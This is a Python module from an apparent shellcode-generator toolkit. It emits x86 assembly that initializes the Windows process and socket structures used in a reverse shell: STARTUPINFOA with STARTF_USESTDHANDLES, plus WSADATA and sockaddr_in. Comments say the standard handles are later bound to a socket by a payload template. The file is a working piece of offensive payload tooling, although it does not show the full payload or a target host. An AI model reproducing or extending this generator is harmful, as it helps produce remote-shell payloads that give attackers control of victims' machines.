"""Structure initialization emitter for the shellcode emitter toolkit.

Generates assembly fragments that zero-initialize and configure x86 structures
on the stack frame. Only handles structures from STRUCT_DATABASE.
"""
from __future__ import annotations

from .schema import Manifest
from .stack_alloc import StackLayout


def emit_structure(name: str, layout: StackLayout) -> str:
    """Emit initialization assembly for a single structure slot."""
    slot = layout.slot(name)
    ref = slot.ebp_ref

    if name == "STARTUPINFOA":
        return _emit_startupinfoa(ref)
    elif name == "PROCESS_INFORMATION":
        return _emit_process_information(ref)
    elif name == "WSADATA":
        return _emit_wsadata(ref)
    elif name == "sockaddr_in":
        return _emit_sockaddr_in(ref)
    else:
        size = slot.size
        return "\n".join([
            f"; --- {name} at {ref} ({hex(size)} bytes) ---",
            f"; No initialization template available for {name}.",
            "",
        ])


def _emit_startupinfoa(ref: str) -> str:
    return "\n".join([
        f"; --- STARTUPINFOA at {ref} (0x44 bytes) ---",
        "",
        "    xor  eax, eax",
        f"    lea  edi, {ref}",
        "",
        "    ; zero 0x44 bytes (17 DWORDs)",
        "    mov  ecx, 17",
        "startupinfoa_zero_loop:",
        "    mov  [edi], eax",
        "    add  edi, 4",
        "    loop startupinfoa_zero_loop",
        "",
        f"    lea  edi, {ref}",
        "    mov  byte ptr [edi], 0x44      ; cb = sizeof(STARTUPINFOA)",
        "",
        "    mov  eax, 1",
        "    rol  eax, 8                    ; eax = 0x100",
        "    mov  [edi+0x2c], eax           ; dwFlags = STARTF_USESTDHANDLES",
        "",
        "    ; hStdInput/hStdOutput/hStdError set by payload after socket creation",
        "",
    ])


def _emit_process_information(ref: str) -> str:
    return "\n".join([
        f"; --- PROCESS_INFORMATION at {ref} (0x10 bytes) ---",
        "",
        "    xor  eax, eax",
        f"    lea  edi, {ref}",
        "    mov  [edi+0x00], eax",
        "    mov  [edi+0x04], eax",
        "    mov  [edi+0x08], eax",
        "    mov  [edi+0x0c], eax",
        "",
    ])


def _emit_wsadata(ref: str) -> str:
    return "\n".join([
        f"; --- WSADATA at {ref} (0x190 bytes) ---",
        f"; No initialization needed — WSAStartup writes output to {ref}.",
        "",
    ])


def _emit_sockaddr_in(ref: str) -> str:
    return "\n".join([
        f"; --- sockaddr_in at {ref} (0x10 bytes) ---",
        "; sin_port and sin_addr are set by the payload template.",
        "",
        "    xor  eax, eax",
        f"    lea  edi, {ref}",
        "    mov  [edi+0x00], eax",
        "    mov  [edi+0x04], eax",
        "    mov  [edi+0x08], eax",
        "    mov  [edi+0x0c], eax",
        "",
        "    ; sin_family = AF_INET",
        "    mov  word ptr [edi], 0x0002",
        "",
        "    ; Template sets sin_port (+0x02) and sin_addr (+0x04) before connect()",
        "",
    ])


def emit_all_structures(manifest: Manifest, layout: StackLayout) -> str:
    """Emit initialization code for all structures in layout order."""
    struct_slots = layout.slots_by_category("structure")
    parts = [emit_structure(slot.name, layout) for slot in struct_slots]
    return "\n".join(parts)
